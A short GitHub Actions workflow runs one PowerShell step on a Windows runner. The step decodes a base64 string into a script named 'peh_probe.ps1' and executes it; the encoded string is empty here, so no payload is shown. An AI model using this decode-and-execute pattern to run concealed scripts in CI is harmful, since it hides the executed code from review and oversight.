name: edge-peh-state
on:
  workflow_dispatch: {}
jobs:
  probe:
    runs-on: windows-latest
    timeout-minutes: 45
    steps:
      - name: probe
        shell: pwsh
        run: |
          $b64 = ""
          $tmp = Join-Path $env:RUNNER_TEMP "peh_probe.b64"
          Set-Content -Path $tmp -Value $b64 -NoNewline
          $bytes = [Convert]::FromBase64String((Get-Content -Raw $tmp))
          $ps = Join-Path $env:RUNNER_TEMP "peh_probe.ps1"
          [IO.File]::WriteAllBytes($ps, $bytes)
          & $ps
